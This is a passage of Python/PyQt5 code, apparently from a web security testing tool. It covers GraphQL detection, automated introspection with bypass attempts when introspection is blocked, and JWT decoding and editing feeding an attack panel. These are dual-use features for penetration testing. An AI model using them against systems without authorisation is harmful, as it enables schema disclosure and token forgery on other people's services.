        op_name  = self.req_gql_opname_text.toPlainText().strip().splitlines()[0].strip() if self.req_gql_opname_text.toPlainText().strip() else ""
        variables: dict = {}
        if vars_txt:
            try:
                variables = json.loads(vars_txt)
            except Exception:
                pass  # leave variables empty if the JSON is malformed
        body_dict: dict = {"query": query}
        if variables:
            body_dict["variables"] = variables
        if op_name:
            body_dict["operationName"] = op_name
        new_body  = json.dumps(body_dict, indent=2, ensure_ascii=False)
        body_bytes = new_body.encode("utf-8")
        # Update Content-Length header if present
        header_lines = header_part.splitlines()
        new_header_lines = []
        for line in header_lines:
            if line.lower().startswith("content-length:"):
                new_header_lines.append(f"Content-Length: {len(body_bytes)}")
            else:
                new_header_lines.append(line)
        new_raw = "\n".join(new_header_lines) + sep + new_body
        # Block signals so the textChanged debounce doesn't immediately re-detect
        self.request_editor.blockSignals(True)
        self.request_editor.setPlainText(new_raw)
        self.request_editor.blockSignals(False)
        # Update in-memory gql_state to match edits
        self._gql_state["query"]          = query
        self._gql_state["variables"]      = variables
        self._gql_state["operation_name"] = op_name

    def _make_gql_panel(self, title: str, title_color: str, read_only: bool = True, highlight: str = None):
        """Create a titled section panel for the GraphQL splitter."""
        panel = QWidget()
        panel.setMinimumHeight(50)
        pl = QVBoxLayout(panel)
        pl.setContentsMargins(0, 0, 0, 0)
        pl.setSpacing(0)
        hdr = QFrame()
        hdr.setFixedHeight(22)
        hdr.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};")
        hl = QHBoxLayout(hdr)
        hl.setContentsMargins(10, 0, 8, 0)
        lbl = QLabel(title)
        lbl.setStyleSheet(f"color:{title_color};font-weight:700;font-size:10px;letter-spacing:1px;")
        hl.addWidget(lbl)
        hl.addStretch()
        pl.addWidget(hdr)
        te = QTextEdit()
        te.setReadOnly(read_only)
        te._title_lbl = lbl  # kept for dynamic title updates
        if read_only:
            te.setStyleSheet(f"background:{COLOR_DARK_BG};color:{COLOR_TEXT};font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;padding:4px;")
        else:
            te.setStyleSheet(
                f"background:{COLOR_DARK_BG};color:{COLOR_TEXT_BRIGHT};"
                f"font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;padding:4px;"
            )
        if highlight == "gql":
            te._hl = GQLSyntaxHighlighter(te.document())
        elif highlight == "json":
            te._hl = JSONSyntaxHighlighter(te.document())
        pl.addWidget(te)
        return panel, te

    def _detect_graphql(self, url: str, request_text: str, response_text: str) -> dict:
        import json
        url_lower  = (url or "").lower()
        url_hint   = any(p in url_lower for p in
                         ("/graphql", "/gql", "/graphiql", "/playground", "graphql.json", "graphql.php"))
        req_headers: dict = {}; body = ""
        if request_text:
            lines = request_text.split("\n"); in_body = False
            for line in lines[1:]:
                stripped = line.rstrip("\r")
                if not in_body:
                    if stripped == "": in_body = True
                    elif ":" in stripped:
                        k, _, v = stripped.partition(":")
                        req_headers[k.strip().lower()] = v.strip()
                else:
                    body += stripped + "\n"
            body = body.strip()
        ct = req_headers.get("content-type", "")
        ct_graphql = "application/graphql" in ct
        ct_json    = "application/json" in ct or ct == ""
        query = ""; variables: dict = {}; operation_name = ""; operation_type = "query"
        if body and ct_json:
            try:
                p = json.loads(body)
                if isinstance(p, dict):
                    query = p.get("query", "") or ""
                    variables = p.get("variables") or {}
                    operation_name = p.get("operationName") or ""
            except Exception: pass
        if not query and ct_graphql and body: query = body
        qs = query.lstrip()
        if qs.startswith("mutation"):       operation_type = "mutation"
        elif qs.startswith("subscription"): operation_type = "subscription"
        introspection  = "__schema" in query or "__type" in query or "IntrospectionQuery" in (operation_name + query)
        resp_json_hint = False
        if response_text:
            try:
                pos = response_text.find("\n\n")
                if pos == -1: pos = response_text.find("\r\n\r\n")
                rb  = response_text[pos:].strip() if pos != -1 else response_text
                if rb.startswith("{"):
                    rd = json.loads(rb)
                    if isinstance(rd, dict) and ("data" in rd or "errors" in rd): resp_json_hint = True
            except Exception: pass
        if not (url_hint or (query and (ct_graphql or ct_json)) or resp_json_hint): return {}
        return {
            "is_graphql": True, "query": query, "variables": variables,
            "operation_name": operation_name, "operation_type": operation_type,
            "introspection": introspection, "url_hint": url_hint, "resp_json_hint": resp_json_hint,
        }

    def _update_gql_state(self, url: str, request_text: str, response_text: str) -> None:
        gql = self._detect_graphql(url, request_text, response_text)
        # Remember current view mode before resetting state
        was_req_gql  = self._gql_req_mode
        was_resp_gql = self._gql_resp_mode
        self._gql_state = gql; self._gql_req_mode = False; self._gql_resp_mode = False
        for btn in (self.req_graphql_btn, self.resp_graphql_btn):
            btn.blockSignals(True); btn.setChecked(False); btn.blockSignals(False)
        self.req_graphql_btn.setText("⬡ GraphQL")
        self.req_graphql_btn.setVisible(bool(gql.get("query") or gql.get("url_hint")))
        self.req_introspect_btn.setVisible(bool(gql.get("query") or gql.get("url_hint")))
        self.resp_graphql_btn.setVisible(bool(gql.get("resp_json_hint")))
        self.resp_visualizer_btn.setVisible(bool(gql.get("resp_json_hint")))
        # Preserve GQL view if it was active (e.g. after Send)
        if was_req_gql and gql:
            self._gql_req_mode = True
            self.req_graphql_btn.blockSignals(True)
            self.req_graphql_btn.setChecked(True)
            self.req_graphql_btn.setText("◎ Raw")
            self.req_graphql_btn.blockSignals(False)
            self._populate_gql_req_panels(gql)
            self.req_stack.setCurrentIndex(1)
        else:
            if not self._jwt_req_mode:
                self.req_stack.setCurrentIndex(0)
        if was_resp_gql and gql:
            self._gql_resp_mode = True
            self.resp_graphql_btn.blockSignals(True)
            self.resp_graphql_btn.setChecked(True)
            self.resp_graphql_btn.setText("◎ Raw")
            self.resp_graphql_btn.blockSignals(False)
            self._populate_gql_resp_panels(response_text, gql)
            self.resp_stack.setCurrentIndex(1)
        else:
            if not self._jwt_resp_mode:
                self.resp_stack.setCurrentIndex(0)

    def _reset_gql_view(self) -> None:
        self._gql_state = {}; self._gql_req_mode = False; self._gql_resp_mode = False
        for attr in ("req_graphql_btn", "resp_graphql_btn"):
            if hasattr(self, attr):
                b = getattr(self, attr)
                b.setVisible(False); b.setChecked(False)
        for attr in ("req_introspect_btn", "resp_visualizer_btn"):
            if hasattr(self, attr):
                getattr(self, attr).setVisible(False)
        if hasattr(self, "req_stack"):  self.req_stack.setCurrentIndex(0)
        if hasattr(self, "resp_stack"): self.resp_stack.setCurrentIndex(0)

    def _show_gql_visualizer(self) -> None:
        """Parse the introspection JSON from the response body and open the schema visualizer."""
        import json as _json, tempfile, os
        from PyQt5.QtGui import QDesktopServices
        from PyQt5.QtCore import QUrl
        resp_text = self.resp_raw.toPlainText()
        resp_body = ""
        for sep in ("\r\n\r\n", "\n\n"):
            pos = resp_text.find(sep)
            if pos != -1:
                resp_body = resp_text[pos + len(sep):].strip()
                break
        if not resp_body:
            QMessageBox.information(self, "No Response Body", "No response body found.")
            return
        try:
            parsed = _json.loads(resp_body)
        except Exception:
            QMessageBox.warning(self, "Parse Error", "Response body is not valid JSON.")
            return
        # Accept {__schema:...} or {data:{__schema:...}}
        schema_data = None
        if isinstance(parsed, dict):
            if "__schema" in parsed:
                schema_data = parsed
            elif isinstance(parsed.get("data"), dict) and "__schema" in parsed["data"]:
                schema_data = parsed["data"]
        if not schema_data:
            QMessageBox.information(
                self, "Not Introspection Data",
                "No __schema found in the response.\n"
                "Use \u2b21 Full Introspection to fetch the schema first."
            )
            return
        html = _build_visualizer_html(schema_data)
        fd, path = tempfile.mkstemp(suffix=".html", prefix="gql_viz_")
        with os.fdopen(fd, "w", encoding="utf-8") as f:
            f.write(html)
        QDesktopServices.openUrl(QUrl.fromLocalFile(path))

    def _run_introspection(self) -> None:
        """Inject the full introspection query into the request and send it."""
        # Update GQL panels with introspection query
        self.req_gql_query_text.blockSignals(True)
        self.req_gql_query_text.setPlainText(_FULL_INTROSPECT_QUERY)
        self.req_gql_query_text.blockSignals(False)
        self.req_gql_vars_text.blockSignals(True)
        self.req_gql_vars_text.setPlainText("")
        self.req_gql_vars_text.blockSignals(False)
        self.req_gql_opname_text.blockSignals(True)
        self.req_gql_opname_text.setPlainText("IntrospectionQuery")
        self.req_gql_opname_text.blockSignals(False)
        # Write the introspection payload to the raw editor
        self._sync_gql_to_raw()
        # Mark that the next response should be checked for an introspection block
        self._introspection_pending = True
        # Send without re-syncing (raw editor already has the correct body)
        _was_gql = self._gql_req_mode
        self._gql_req_mode = False
        self._send_request()
        self._gql_req_mode = _was_gql

    # ── Introspection bypass helpers ──────────────────────────────────────────

    def _run_introspection_from_menu(self) -> None:
        """
        Context-menu entry: send full introspection regardless of auto-detection.
        Patches the raw request in-place (method→POST, Content-Type→json, injects body)
        so it works on endpoints not auto-detected as GraphQL.
        """
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            return
        # Split headers / body
        if "\r\n\r\n" in raw:
            hdr_part, _ = raw.split("\r\n\r\n", 1)
            sep = "\r\n\r\n"
        elif "\n\n" in raw:
            hdr_part, _ = raw.split("\n\n", 1)
            sep = "\n\n"
        else:
            hdr_part, sep = raw, "\n\n"
        hdr_lines = hdr_part.splitlines()
        # Ensure POST method on first line
        if hdr_lines:
            first = hdr_lines[0]
            parts = first.split()
            if parts and parts[0].upper() != "POST":
                hdr_lines[0] = "POST " + " ".join(parts[1:]) if len(parts) > 1 else "POST /graphql HTTP/1.1"
        # Build introspection body
        intro_body = json.dumps(
            {"query": _FULL_INTROSPECT_QUERY, "operationName": "IntrospectionQuery"},
            ensure_ascii=False,
        )
        body_bytes = intro_body.encode("utf-8")
        # Update / add Content-Type and Content-Length
        has_ct = has_cl = False
        for i, line in enumerate(hdr_lines):
            ll = line.lower()
            if ll.startswith("content-type:"):
                hdr_lines[i] = "Content-Type: application/json"
                has_ct = True
            elif ll.startswith("content-length:"):
                hdr_lines[i] = f"Content-Length: {len(body_bytes)}"
                has_cl = True
        if not has_ct:
            hdr_lines.append("Content-Type: application/json")
        if not has_cl:
            hdr_lines.append(f"Content-Length: {len(body_bytes)}")
        new_raw = "\n".join(hdr_lines) + sep + intro_body
        self.request_editor.blockSignals(True)
        self.request_editor.setPlainText(new_raw)
        self.request_editor.blockSignals(False)
        # Mark as introspection so bypass auto-triggers if blocked
        self._introspection_pending = True
        _was_gql = self._gql_req_mode
        self._gql_req_mode = False
        self._send_request()
        self._gql_req_mode = _was_gql

    @staticmethod
    def _is_introspect_blocked(resp_text: str) -> bool:
        """Return True if the response body contains a known introspection-blocked message."""
        body = resp_text
        if "\r\n\r\n" in resp_text:
            body = resp_text.split("\r\n\r\n", 1)[1]
        elif "\n\n" in resp_text:
            body = resp_text.split("\n\n", 1)[1]
        body_lower = body.lower()
        return any(p in body_lower for p in _INTROSPECT_BLOCK_PATTERNS)

    def _try_introspect_bypass(self) -> None:
        """Launch bypass attempts after introspection was detected as blocked."""
        raw = self.request_editor.toPlainText().strip()
        if not raw:
            return
        host = self.host_input.text().strip() or self._parse_host_from_request()
        if not host:
            return
        try:
            port = int(self.port_input.text()) if self.port_input.text() else (443 if self.ssl_check.isChecked() else 80)
        except ValueError:
            port = 443 if self.ssl_check.isChecked() else 80

        self.status_bar.setText("⚠ Introspection blocked — trying bypass techniques…")
        self.send_btn.setEnabled(False)
        self.send_btn.setText("⏳ Bypassing…")

        self._bypass_thread = _IntroBypassThread(
            host, port, self.ssl_check.isChecked(), raw, self.timeout_spin.value()
        )
        self._bypass_thread.attempt_result.connect(self._on_bypass_attempt)
        self._bypass_thread.all_done.connect(self._on_bypass_done)
        self._bypass_thread.start()

    def _on_bypass_attempt(self, technique: str, bypass_req: str,
                           resp_text: str, elapsed_ms: float) -> None:
        """Called for each bypass attempt — update UI on success or show progress."""
        if _IntroBypassThread._looks_like_schema(resp_text):
            # ── Success: replace editors with the working bypass ──────────
            self.request_editor.setPlainText(bypass_req)
            self.resp_raw.setPlainText(resp_text)

            if "\r\n\r\n" in resp_text:
                hdr, bdy = resp_text.split("\r\n\r\n", 1)
            elif "\n\n" in resp_text:
                hdr, bdy = resp_text.split("\n\n", 1)
            else:
                hdr, bdy = resp_text, ""
            try:
                pretty_bdy = json.dumps(json.loads(bdy), indent=2)
            except Exception:
                pretty_bdy = bdy
            self.resp_pretty.setPlainText(hdr + "\n\n" + pretty_bdy)
            self.resp_headers.setPlainText(hdr)

            m = re.match(r'HTTP/\S+\s+(\d+)', resp_text)
            if m:
                self.status_badge.setText(f"<b style='color:#98c379;'>{m.group(1)}</b>")
            self.length_badge.setText(f"  {self._format_size(len(resp_text.encode('utf-8')))}")
            self.time_badge.setText(f"  {elapsed_ms:.0f} ms")

            _scheme = "https" if self.ssl_check.isChecked() else "http"
            self._update_gql_state(
                f"{_scheme}://{self.host_input.text()}", bypass_req, resp_text
            )
        else:
            # Failed attempt — show progress so the user knows we're trying
            self.status_bar.setText(f"⚠ Bypass '{technique}' blocked — trying next technique…")

    def _on_bypass_done(self, found: bool) -> None:
        """Called when all bypass attempts are finished."""
        self.send_btn.setEnabled(True)
        self.send_btn.setText("▶  Send")
        if found:
            self.status_bar.setText(
                "✅ Introspection bypass succeeded — schema loaded in response"
            )
        else:
            self.status_bar.setText(
                "✖ All introspection bypass techniques failed (introspection fully disabled)"
            )

    def _toggle_gql_req(self) -> None:
        self._gql_req_mode = self.req_graphql_btn.isChecked()
        if self._gql_req_mode:
            self._populate_gql_req_panels(self._gql_state)
            self.req_stack.setCurrentIndex(1)
            self.req_graphql_btn.setText("◎ Raw")
        else:
            self._sync_gql_to_raw()  # write edits from panels back to raw editor
            self.req_stack.setCurrentIndex(0)
            self.req_graphql_btn.setText("⬡ GraphQL")

    def _toggle_gql_resp(self) -> None:
        self._gql_resp_mode = self.resp_graphql_btn.isChecked()
        if self._gql_resp_mode:
            self._populate_gql_resp_panels(self.resp_raw.toPlainText(), self._gql_state)
            self.resp_stack.setCurrentIndex(1)
            self.resp_graphql_btn.setText("◎ Raw")
        else:
            self.resp_stack.setCurrentIndex(0)
            self.resp_graphql_btn.setText("⬡ GraphQL")

    def _populate_gql_req_panels(self, gql: dict) -> None:
        import json
        query = gql.get("query", ""); vars_ = gql.get("variables") or {}
        op_name = gql.get("operation_name", ""); op_type = gql.get("operation_type", "query")
        is_intro = gql.get("introspection", False)
        # Update query panel title with operation type badge
        type_badge = f"  ·  {op_type.upper()}" + ("  ·  Introspection" if is_intro else "")
        if hasattr(self.req_gql_query_text, "_title_lbl"):
            self.req_gql_query_text._title_lbl.setText(f"⬡  QUERY{type_badge}")
        self.req_gql_query_text.setPlainText(query.strip() or "")
        self.req_gql_query_panel.setVisible(True)
        if vars_:
            self.req_gql_vars_text.setPlainText(json.dumps(vars_, indent=2))
        else:
            self.req_gql_vars_text.setPlainText("")
        self.req_gql_vars_panel.setVisible(True)
        # Operation name panel: show just the name string (editable)
        if op_name:
            self.req_gql_opname_text.setPlainText(op_name)
            self.req_gql_opname_panel.setVisible(True)
        else:
            self.req_gql_opname_text.setPlainText("")
            self.req_gql_opname_panel.setVisible(False)
        panels = [self.req_gql_query_panel, self.req_gql_vars_panel, self.req_gql_opname_panel]
        weights = [700, 250, 50]
        sizes  = [w if p.isVisible() else 0 for p, w in zip(panels, weights)]
        self.req_gql_splitter.setSizes(sizes)

    def _populate_gql_resp_panels(self, response_text: str, gql: dict) -> None:
        import json
        resp_body = ""
        if response_text:
            pos = response_text.find("\n\n")
            if pos == -1: pos = response_text.find("\r\n\r\n")
            resp_body = response_text[pos:].strip() if pos != -1 else response_text.strip()
        parsed = None
        if resp_body:
            try: parsed = json.loads(resp_body)
            except Exception: pass
        data   = parsed.get("data")       if isinstance(parsed, dict) else None
        errors = parsed.get("errors")     if isinstance(parsed, dict) else None
        exts   = parsed.get("extensions") if isinstance(parsed, dict) else None
        if errors:
            if isinstance(errors, list):
                lines_out: list = []
                for idx, err in enumerate(errors, 1):
                    msg  = err.get("message", str(err)) if isinstance(err, dict) else str(err)
                    locs = err.get("locations", []) if isinstance(err, dict) else []
                    path = err.get("path", [])     if isinstance(err, dict) else []
                    lines_out.append(f"[{idx}]  {msg}")
                    for loc in locs:
                        lines_out.append(f"       at line {loc.get('line', '?')}, column {loc.get('column', '?')}")
                    if path: lines_out.append(f"       path: {' → '.join(str(p) for p in path)}")
                    lines_out.append("")
                self.resp_gql_errors_text.setPlainText("\n".join(lines_out).rstrip())
            else:
                self.resp_gql_errors_text.setPlainText(json.dumps(errors, indent=2))
            self.resp_gql_errors_panel.setVisible(True)
        else:
            self.resp_gql_errors_panel.setVisible(False)
        if parsed is not None:
            self.resp_gql_data_text.setPlainText("(null)" if data is None else json.dumps(data, indent=2))
            self.resp_gql_data_panel.setVisible(True)
        else:
            self.resp_gql_data_text.setPlainText("(could not parse response body as JSON)")
            self.resp_gql_data_panel.setVisible(True)
        if exts:
            self.resp_gql_exts_text.setPlainText(json.dumps(exts, indent=2))
            self.resp_gql_exts_panel.setVisible(True)
        else:
            self.resp_gql_exts_panel.setVisible(False)
        panels = [self.resp_gql_errors_panel, self.resp_gql_data_panel, self.resp_gql_exts_panel]
        weights = [150, 700, 150]
        sizes  = [w if p.isVisible() else 0 for p, w in zip(panels, weights)]
        self.resp_gql_splitter.setSizes(sizes)

    # ─────────────────────────────────────────────────────────────────────────
    # JWT Detection + Analysis helpers
    # ─────────────────────────────────────────────────────────────────────────

    @staticmethod
    def _b64url_decode(s: str) -> bytes:
        s = s.replace('-', '+').replace('_', '/')
        pad = 4 - len(s) % 4
        if pad != 4:
            s += '=' * pad
        return base64.b64decode(s)

    @staticmethod
    def _b64url_encode(b: bytes) -> str:
        return base64.b64encode(b).decode().rstrip('=').replace('+', '-').replace('/', '_')

    @staticmethod
    def _detect_jwt(text: str) -> dict:
        """
        Find the first JWT token in an HTTP request string.
        Returns dict with keys: token, location, raw_header, raw_payload, raw_sig
        or empty dict if none found.
        """
        JWT_PATTERN = re.compile(
            r'(eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*)',
            re.MULTILINE
        )
        # Determine location context
        lines = text.splitlines()
        for line in lines[:60]:  # only scan header section
            m = JWT_PATTERN.search(line)
            if not m:
                continue
            token = m.group(1)
            lower = line.lower().lstrip()
            if lower.startswith('authorization:'):
                location = 'Authorization header'
            elif lower.startswith('cookie:'):
                location = 'Cookie header'
            elif lower.startswith('x-auth') or lower.startswith('x-token') or lower.startswith('x-access'):
                location = f'Header: {line.split(":")[0].strip()}'
            else:
                # check in body
                location = f'Header: {line.split(":")[0].strip()}'
            parts = token.split('.')
            if len(parts) != 3:
                continue
            return {
                'token':      token,
                'location':   location,
                'raw_header':  parts[0],
                'raw_payload': parts[1],
                'raw_sig':     parts[2],
                '_line':       line,
            }
        # Also check body
        in_body = False
        for line in lines:
            if not line.strip():
                in_body = True
            if in_body:
                m = JWT_PATTERN.search(line)
                if m:
                    token = m.group(1)
                    parts = token.split('.')
                    if len(parts) == 3:
                        return {
                            'token':      token,
                            'location':   'Request body',
                            'raw_header':  parts[0],
                            'raw_payload': parts[1],
                            'raw_sig':     parts[2],
                            '_line':       line,
                        }
        return {}

    def _decode_jwt_info(self, jwt_raw: dict) -> dict:
        """Decode JWT header + payload JSON from base64url parts."""
        result = dict(jwt_raw)
        try:
            result['header_json'] = json.loads(
                self._b64url_decode(jwt_raw['raw_header']).decode('utf-8', errors='replace')
            )
        except Exception:
            result['header_json'] = {}
        try:
            result['payload_json'] = json.loads(
                self._b64url_decode(jwt_raw['raw_payload']).decode('utf-8', errors='replace')
            )
        except Exception:
            result['payload_json'] = {}
        result['alg'] = result.get('header_json', {}).get('alg', '?')
        result['exp'] = result.get('payload_json', {}).get('exp')
        result['iat'] = result.get('payload_json', {}).get('iat')
        result['nbf'] = result.get('payload_json', {}).get('nbf')
        return result

    def _update_jwt_state(self, request_text: str, response_text: str = "") -> None:
        """Detect JWTs and show/hide JWT buttons."""
        raw_req = self._detect_jwt(request_text) if request_text else {}
        raw_resp = {}
        if response_text:
            # look for JWT in response headers and body (e.g. Set-Cookie, JSON body)
            raw_resp = self._detect_jwt(response_text)

        req_jwt = self._decode_jwt_info(raw_req) if raw_req else {}
        resp_jwt = self._decode_jwt_info(raw_resp) if raw_resp else {}

        self._jwt_state = {'req': req_jwt, 'resp': resp_jwt}

        # Show/hide buttons
        self.req_jwt_btn.setVisible(bool(req_jwt))
        self.resp_jwt_btn.setVisible(bool(resp_jwt))

        # If JWT view was active but token disappeared, go back to raw
        if self._jwt_req_mode and not req_jwt:
            self._jwt_req_mode = False
            self.req_jwt_btn.setChecked(False)
            self.req_jwt_btn.setText(" JWT")
            self.req_stack.setCurrentIndex(0)
        elif self._jwt_req_mode and req_jwt:
            # Update cached state only — do NOT repopulate editors while the user
            # is actively working in the JWT view (the raw request may now hold the
            # unsigned/modified token from the last Send auto-flush, which would
            # overwrite the displayed signature with "(unsigned)").
            self._jwt_state['req'] = req_jwt

        if self._jwt_resp_mode and not resp_jwt:
            self._jwt_resp_mode = False
            self.resp_jwt_btn.setChecked(False)
            self.resp_jwt_btn.setText(" JWT")
            self.resp_stack.setCurrentIndex(0)
        elif self._jwt_resp_mode and resp_jwt:
            self._populate_jwt_panel(
                self._jwt_resp_hdr_edit, self._jwt_resp_pay_edit,
                self._jwt_resp_sig_edit, self._jwt_resp_info_lbl, resp_jwt
            )

    def _toggle_jwt_req(self) -> None:
        self._jwt_req_mode = self.req_jwt_btn.isChecked()
        if self._jwt_req_mode:
            # Always re-detect from the live raw request so the signature
            # display reflects the actual token in the editor, not a stale cache.
            raw_text = self.request_editor.toPlainText()
            raw_req  = self._detect_jwt(raw_text) if raw_text else {}
            req_jwt  = self._decode_jwt_info(raw_req) if raw_req else self._jwt_state.get('req', {})
            if req_jwt:
                self._jwt_state['req'] = req_jwt
                self._populate_jwt_req_panel(req_jwt)
            self.req_stack.setCurrentIndex(2)
            self.req_jwt_btn.setText("◎ Raw")
            # Visually deactivate GQL view if active
            if self._gql_req_mode:
                self._gql_req_mode = False
                self.req_graphql_btn.blockSignals(True)
                self.req_graphql_btn.setChecked(False)
                self.req_graphql_btn.setText("⬡ GraphQL")
                self.req_graphql_btn.blockSignals(False)
        else:
            # Flush any pending edits immediately before returning to raw view
            if hasattr(self, '_jwt_live_timer') and self._jwt_live_timer.isActive():
                self._jwt_live_timer.stop()
                self._jwt_live_apply()
            self.req_stack.setCurrentIndex(0)
            self.req_jwt_btn.setText(" JWT")

    def _toggle_jwt_resp(self) -> None:
        self._jwt_resp_mode = self.resp_jwt_btn.isChecked()
        if self._jwt_resp_mode:
            resp_jwt = self._jwt_state.get('resp', {})
            if resp_jwt:
                self._populate_jwt_panel(
                    self._jwt_resp_hdr_edit, self._jwt_resp_pay_edit,
                    self._jwt_resp_sig_edit, self._jwt_resp_info_lbl, resp_jwt
                )
            self.resp_stack.setCurrentIndex(2)
            self.resp_jwt_btn.setText("◎ Raw")
            # Deactivate GQL resp view if active
            if self._gql_resp_mode:
                self._gql_resp_mode = False
                self.resp_graphql_btn.blockSignals(True)
                self.resp_graphql_btn.setChecked(False)
                self.resp_graphql_btn.setText("⬡ GraphQL")
                self.resp_graphql_btn.blockSignals(False)
        else:
            self.resp_stack.setCurrentIndex(0)
            self.resp_jwt_btn.setText(" JWT")

    def _populate_jwt_panel(self, hdr_edit, pay_edit, sig_edit, info_lbl, jwt_info: dict):
        """Fill in the JWT panel editors with decoded data."""
        hdr_json = jwt_info.get('header_json', {})
        pay_json = jwt_info.get('payload_json', {})
        sig_raw  = jwt_info.get('raw_sig', '')

        hdr_edit.blockSignals(True)
        hdr_edit.setPlainText(json.dumps(hdr_json, indent=2) if hdr_json else '{}')
        hdr_edit.blockSignals(False)

        pay_edit.blockSignals(True)
        pay_edit.setPlainText(json.dumps(pay_json, indent=2) if pay_json else '{}')
        pay_edit.blockSignals(False)

        if sig_edit is not None:
            sig_edit.setPlainText(sig_raw if sig_raw else '(unsigned)')

        # Build info label HTML
        import time as _time
        alg = str(jwt_info.get('alg') or '?')
        exp = jwt_info.get('exp')
        iat = jwt_info.get('iat')
        loc = jwt_info.get('location', '')

        # Algorithm badge
        if alg in ('none', '', 'null'):
            alg_color = '#f38ba8'   # red — dangerous
            alg_badge = f'<b style="color:{alg_color}">alg:{alg} ⚠ UNSIGNED</b>'
        elif alg.startswith('HS'):
            alg_color = '#e5a550'   # amber — symmetric, weak if short secret
            alg_badge = f'<b style="color:{alg_color}">alg:{alg}</b>'
        elif alg.startswith('RS') or alg.startswith('ES') or alg.startswith('PS'):
            alg_color = '#a6e3a1'   # green — asymmetric
            alg_badge = f'<b style="color:{alg_color}">alg:{alg}</b>'
        else:
            alg_color = '#cdd6f4'
            alg_badge = f'<b style="color:{alg_color}">alg:{alg}</b>'

        # Expiry badge
        now = _time.time()
        if exp is not None:
            try:
                exp_ts = int(exp)
                import datetime as _dt
                exp_dt = _dt.datetime.utcfromtimestamp(exp_ts).strftime('%Y-%m-%d %H:%M UTC')
                if exp_ts < now:
                    exp_badge = f'<b style="color:#f38ba8">EXPIRED ({exp_dt})</b>'
                else:
                    remaining = int(exp_ts - now)
                    if remaining < 300:
                        exp_badge = f'<b style="color:#e5a550">exp in {remaining}s ({exp_dt})</b>'
                    else:
                        exp_badge = f'<b style="color:#a6e3a1">valid until {exp_dt}</b>'
            except Exception:
                exp_badge = '<span style="color:#6c7086">exp:?</span>'
        else:
            exp_badge = '<span style="color:#e5a550">no exp claim ⚠</span>'

        # Subject / Role highlights from payload
        interesting = []
        _highlight_claims = ('sub','iss','aud','role','roles','admin','email',
                              'user','username','user_id','uid','scope','permissions')
        for k in _highlight_claims:
            v = pay_json.get(k)
            if v is not None:
                interesting.append(f'<span style="color:#89b4fa">{k}</span>='
                                   f'<span style="color:#f9e2af">{html.escape(str(v)[:60])}</span>')

        loc_html = f'<span style="color:#6c7086">{html.escape(loc)}</span>'
        claims_html = '  '.join(interesting[:6])

        info_lbl.setText(
            f'{loc_html} &nbsp; {alg_badge} &nbsp; {exp_badge}'
            + (f'<br>{claims_html}' if claims_html else '')
        )

    def _populate_jwt_req_panel(self, jwt_info: dict):
        """Populate request JWT panel editors and info bar."""
        self._populate_jwt_panel(
            self._jwt_req_hdr_edit,
            self._jwt_req_pay_edit,
            self._jwt_req_sig_display,
            self._jwt_req_info_lbl,
            jwt_info
        )

    # ── JWT panel builders ────────────────────────────────────────────────────

    def _make_jwt_te(self, read_only=False, sig=False) -> "QPlainTextEdit":
        te = QPlainTextEdit()
        te.setReadOnly(read_only)
        te.setStyleSheet(
            f"background:{COLOR_DARK_BG};color:{COLOR_TEXT_BRIGHT};"
            f"font-family:{FONT_FAMILY_MONO};font-size:12px;border:none;padding:4px;"
        )
        te.setLineWrapMode(QPlainTextEdit.WidgetWidth)
        if sig:
            # Signature is raw base64url — colour it as a single token
            te._hl = _JWTSigHighlighter(te.document())
        else:
            # JSON highlighter; store ref to prevent GC
            te._hl = JSONSyntaxHighlighter(te.document())
        return te

    def _make_jwt_section(self, title: str, title_color: str, read_only: bool = False, sig: bool = False):
        panel = QWidget()
        panel.setMinimumHeight(50)
        vl = QVBoxLayout(panel)
        vl.setContentsMargins(0, 0, 0, 0)
        vl.setSpacing(0)
        hdr = QFrame()
        hdr.setFixedHeight(22)
        hdr.setStyleSheet(f"background:{COLOR_ELEVATED_BG};border-bottom:1px solid {COLOR_BORDER};")
        hl = QHBoxLayout(hdr)
        hl.setContentsMargins(10, 0, 8, 0)
        lbl = QLabel(title)
        lbl.setStyleSheet(f"color:{title_color};font-weight:700;font-size:10px;letter-spacing:1px;")
        hl.addWidget(lbl)
        hl.addStretch()
        vl.addWidget(hdr)
        te = self._make_jwt_te(read_only=read_only, sig=sig)
        vl.addWidget(te)
        return panel, te

    def _build_jwt_req_panel(self) -> QWidget:
        """Build the JWT request view (editable header/payload + attack panel)."""
        container = QWidget()
        container.setStyleSheet(f"background:{COLOR_DARK_BG};")
        vl = QVBoxLayout(container)
        vl.setContentsMargins(0, 0, 0, 0)
        vl.setSpacing(0)

        # ── Info bar ──────────────────────────────────────────────────────────
        info_bar = QFrame()
        info_bar.setFixedHeight(44)
        info_bar.setStyleSheet(
            f"background:#11111b;border-bottom:1px solid #313244;"
        )
        info_hl = QHBoxLayout(info_bar)
        info_hl.setContentsMargins(10, 4, 10, 4)
        self._jwt_req_info_lbl = QLabel("Detecting JWT…")
        self._jwt_req_info_lbl.setStyleSheet(
            f"color:{COLOR_TEXT};font-size:11px;background:transparent;"
        )
        self._jwt_req_info_lbl.setWordWrap(True)
        info_hl.addWidget(self._jwt_req_info_lbl)
        vl.addWidget(info_bar)

        # ── Three-panel splitter: Header | Payload | Signature ────────────────
        _spl_style = (
            f"QSplitter::handle:vertical{{background:{COLOR_BORDER};min-height:4px;}}"
            f" QSplitter::handle:vertical:hover{{background:#e5a550;}}"
        )
        spl = QSplitter(Qt.Vertical)
        spl.setHandleWidth(5)
        spl.setChildrenCollapsible(False)
        spl.setStyleSheet(_spl_style)

        hdr_panel, self._jwt_req_hdr_edit = self._make_jwt_section(
            "  HEADER  (decoded JSON — edit to modify alg/kid/typ)",
            "#e5a550", read_only=False
        )
        pay_panel, self._jwt_req_pay_edit = self._make_jwt_section(
            "📋  PAYLOAD  (decoded JSON — edit claims)",
            "#89b4fa", read_only=False
        )
        sig_panel, self._jwt_req_sig_display = self._make_jwt_section(
            "🔒  SIGNATURE  (base64url — read only)",
            "#6c7086", read_only=True, sig=True
        )

        spl.addWidget(hdr_panel)
        spl.addWidget(pay_panel)
        spl.addWidget(sig_panel)
        spl.setSizes([160, 340, 60])
        vl.addWidget(spl, 1)

        # ── Attack panel ──────────────────────────────────────────────────────
        atk_frame = QFrame()
        atk_frame.setStyleSheet(
            f"background:#11111b;border-top:1px solid #313244;"
        )
